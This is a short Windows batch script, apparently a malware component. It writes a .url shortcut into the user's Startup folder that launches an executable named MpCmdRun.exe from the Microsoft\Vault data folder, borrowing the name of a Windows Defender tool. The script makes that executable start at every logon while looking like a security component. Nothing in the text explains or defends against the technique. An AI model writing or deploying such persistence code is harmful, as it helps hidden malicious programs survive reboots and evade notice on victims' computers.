@echo off
set FilePath=%LOCALAPPDATA%\Microsoft\Vault\MpCmdRun.exe
set UrlShortcut=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\MpCmdRun.url

(
echo [InternetShortcut]
echo URL=file:///%FilePath:\=/%
) > "%UrlShortcut%"

pause